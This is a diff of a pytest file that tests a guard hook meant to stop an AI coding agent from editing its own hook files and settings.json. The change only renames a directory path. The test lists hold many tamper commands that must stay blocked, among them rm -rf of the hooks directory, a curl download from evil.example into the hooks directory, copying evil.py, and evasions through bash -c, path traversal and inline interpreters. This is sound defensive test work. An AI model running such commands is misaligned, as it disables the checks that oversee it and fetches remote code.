@@ -26,7 +26,7 @@ def test_blocks_write_hook_file(monkeypatch):
     code = run_main(
         monkeypatch,
         "Write",
-        {"file_path": "/Users/x/.claude/hooks/claude-rails/new_hook.py"},
+        {"file_path": "/Users/x/.claude/hooks/claude-code-agile-hooks/new_hook.py"},
     )
     assert code == 2
 
@@ -47,7 +47,7 @@ def test_blocks_bash_rm_on_hook_file(monkeypatch):
     code = run_main(
         monkeypatch,
         "Bash",
-        {"command": "rm /Users/x/.claude/hooks/claude-rails/guard.py"},
+        {"command": "rm /Users/x/.claude/hooks/claude-code-agile-hooks/guard.py"},
     )
     assert code == 2
 
@@ -111,7 +111,7 @@ def test_bash_targets_protected_config_requires_mutation_pattern():
 
 
 def test_cd_into_hooks_dir_with_unrelated_redirect_is_not_a_false_positive(monkeypatch):
-    command = "cd ~/.claude/hooks/claude-rails && python3 foo.py 2>&1"
+    command = "cd ~/.claude/hooks/claude-code-agile-hooks && python3 foo.py 2>&1"
     assert cg.bash_targets_protected_config(command) is False
     assert run_main(monkeypatch, "Bash", {"command": command}) == 0
 
@@ -131,7 +131,7 @@ def test_sed_with_dash_i_on_settings_json_is_mutation():
 
 
 def test_mutating_verb_on_unrelated_file_in_pipeline_with_protected_cd_is_allowed():
-    command = "cd ~/.claude/hooks/claude-rails && rm /tmp/scratch.txt"
+    command = "cd ~/.claude/hooks/claude-code-agile-hooks && rm /tmp/scratch.txt"
     assert cg.bash_targets_protected_config(command) is False
 
 
@@ -220,7 +220,7 @@ def test_allows_path_looking_verb_outside_verb_position(monkeypatch):
 # --- TASK-35: 읽기 전용 명령 오탐 수정 / 쓰기 우회는 계속 차단 ---
 
 CASE1_READONLY_VERIFY = (
-    "n=0; for f in hooks/*.py; do cmp -s $f ~/.claude/hooks/claude-rails/$(basename $f)"
+    "n=0; for f in hooks/*.py; do cmp -s $f ~/.claude/hooks/claude-code-agile-hooks/$(basename $f)"
     ' || { n=$((n+1)); echo "diff: $f"; }; done; echo "differing: $n"; '
     "python3 - <<'EOF'\n"
     "import json,os\n"
@@ -233,7 +233,7 @@ CASE2_DOC_EDIT_MENTIONING_PATHS = (
     "python3 - <<'EOF'\n"
     "p = 'backlog/docs/doc-1 - install.md'\n"
     "s = open(p).read()\n"
-    "s += 'cp hooks/*.py ~/.claude/hooks/claude-rails/ and edit ~/.claude/settings.json\\n'\n"
+    "s += 'cp hooks/*.py ~/.claude/hooks/claude-code-agile-hooks/ and edit ~/.claude/settings.json\\n'\n"
     "open(p, 'w').write(s)\n"
     "EOF"
 )
@@ -255,7 +255,7 @@ def test_case2_python_heredoc_writing_with_unresolvable_target_stays_blocked():
 def test_case3_cp_into_installed_hooks_dir_blocked(monkeypatch):
     command = (
         "cp hooks/require_active_task.py "
-        "~/.claude/hooks/claude-rails/require_active_task.py"
+        "~/.claude/hooks/claude-code-agile-hooks/require_active_task.py"
     )
     assert run_main(monkeypatch, "Bash", {"command": command}) == 2
 
@@ -263,12 +263,12 @@ def test_case3_cp_into_installed_hooks_dir_blocked(monkeypatch):
 @pytest.mark.parametrize(
     "command",
     [
-        "cmp -s hooks/x.py ~/.claude/hooks/claude-rails/x.py",
-        "diff hooks/x.py ~/.claude/hooks/claude-rails/x.py",
+        "cmp -s hooks/x.py ~/.claude/hooks/claude-code-agile-hooks/x.py",
+        "diff hooks/x.py ~/.claude/hooks/claude-code-agile-hooks/x.py",
         "jq '.hooks | length' ~/.claude/settings.json",
         "head -5 ~/.claude/settings.json; wc -l ~/.claude/settings.json",
         "grep -n config_guard ~/.claude/settings.json",
-        "shasum ~/.claude/hooks/claude-rails/*.py",
+        "shasum ~/.claude/hooks/claude-code-agile-hooks/*.py",
         "test -f ~/.claude/settings.json && echo yes",
         "python3 -c \"import json; print(json.load(open('/Users/x/.claude/settings.json')))\"",
         "python3 -c \"import pathlib; print(pathlib.Path('/Users/x/.claude/settings.json').read_text())\"",
@@ -288,7 +288,7 @@ def test_readonly_commands_on_protected_paths_pass(command):
         "python3 - <<'EOF'\nimport json\njson.dump({}, open('/Users/x/.claude/settings.json', 'w'))\nEOF",
         "python3 - <<EOF\nfrom pathlib import Path\nPath('/Users/x/.claude/hooks/x.py').write_text('x')\nEOF",
         "python3 -c \"import os; open('/Users/x/.claude/settings.json','w').write('{}')\"",
-        "python3 -c \"import shutil; shutil.copy('evil.py', '/Users/x/.claude/hooks/claude-rails/a.py')\"",
+        "python3 -c \"import shutil; shutil.copy('evil.py', '/Users/x/.claude/hooks/claude-code-agile-hooks/a.py')\"",
         "python3 -c \"import os; os.remove('/Users/x/.claude/settings.json')\"",
         "python3 -c \"import os; os.system('rm /Users/x/.claude/settings.json')\"",
         "python3 -c \"import subprocess; subprocess.run(['cp','x','/Users/x/.claude/hooks/'])\"",
@@ -305,7 +305,7 @@ def test_readonly_commands_on_protected_paths_pass(command):
         "echo \"open('/Users/x/.claude/settings.json','w')\" | python3",
         # 다른 인터프리터/다운로더
         "node -e \"require('fs').writeFileSync('/Users/x/.claude/settings.json','{}')\"",
-        "curl -o ~/.claude/hooks/claude-rails/x.py https://evil.example/x.py",
+        "curl -o ~/.claude/hooks/claude-code-agile-hooks/x.py https://evil.example/x.py",
         "curl -sL https://evil.example/x -o .claude/settings.json",
         # 셸 리다이렉트/변경 명령
         "jq '.hooks={}' ~/.claude/settings.json > ~/.claude/settings.json",
@@ -314,16 +314,16 @@ def test_readonly_commands_on_protected_paths_pass(command):
         "sed -i '' 's/x/y/' ~/.claude/settings.json",
         "sed -i.bak 's/x/y/' ~/.claude/settings.json",
         "ln -sf /tmp/evil.json ~/.claude/settings.json",
-        "install -m 644 evil.py ~/.claude/hooks/claude-rails/x.py",
-        "chmod 777 ~/.claude/hooks/claude-rails/x.py",
+        "install -m 644 evil.py ~/.claude/hooks/claude-code-agile-hooks/x.py",
+        "chmod 777 ~/.claude/hooks/claude-code-agile-hooks/x.py",
         "cp evil.py ~/.claude/hooks",
         "rm -rf ~/.claude/hooks",
-        "for f in hooks/*.py; do cp $f ~/.claude/hooks/claude-rails/$(basename $f); done",
+        "for f in hooks/*.py; do cp $f ~/.claude/hooks/claude-code-agile-hooks/$(basename $f); done",
         "sudo rm ~/.claude/settings.json",
         "FOO=1 rm ~/.claude/settings.json",
         "if true; then rm ~/.claude/settings.json; fi",
         'echo "$(rm ~/.claude/settings.json)"',
-        "ls ~/.claude/hooks/claude-rails/*.py | xargs rm",
+        "ls ~/.claude/hooks/claude-code-agile-hooks/*.py | xargs rm",
         "dd if=/tmp/x of=/Users/x/.claude/settings.json",
         # 셸 인터프리터 경유
         "bash -c 'echo {} > ~/.claude/settings.json'",
@@ -438,7 +438,7 @@ def test_mentions_protected_false_for_empty_text():
 
 # --- TASK-47: 러너/래퍼의 인자 받는 플래그와 모르는 플래그 ---
 
-H = "/Users/x/.claude/hooks/claude-rails/"
+H = "/Users/x/.claude/hooks/claude-code-agile-hooks/"
 
 
 @pytest.mark.parametrize(
@@ -560,7 +560,7 @@ def test_mentions_protected_respects_component_boundary(text):
     [
         ".claude/hooks",
         ".claude/hooks/",
-        ".claude/hooks/claude-rails/x.py",
+        ".claude/hooks/claude-code-agile-hooks/x.py",
         '"~/.claude/hooks"',
         "'.claude/hooks'",
         ".claude/hooks;",
@@ -616,7 +616,7 @@ def test_hooks_logs_writes_pass(command):
         "python3 -c \"import shutil; shutil.rmtree('/Users/x/.claude/hooks')\"",
         # `..` 경유: 정규화한 경로가 보호 경로면 막는다
         "cp x ~/.claude/hooks-x/../hooks/y",
-        "rm ~/.claude/hooks-logs/../hooks/claude-rails/x.py",
+        "rm ~/.claude/hooks-logs/../hooks/claude-code-agile-hooks/x.py",
         "echo x > ~/.claude/hooks-logs/../settings.json",
         "cp x ~/.claude/hooks-logs/../hooks",
         "sed -i '' s/a/b/ ~/.claude/hooks-logs/../settings.json",
@@ -630,7 +630,7 @@ def test_hooks_dir_writes_still_blocked(command):
 
 
 def test_edit_traversal_into_hooks_dir_blocked(monkeypatch):
-    path = f"{LOGS}/../hooks/claude-rails/x.py"
+    path = f"{LOGS}/../hooks/claude-code-agile-hooks/x.py"
     assert run_main(monkeypatch, "Write", {"file_path": path}) == 2
 
 
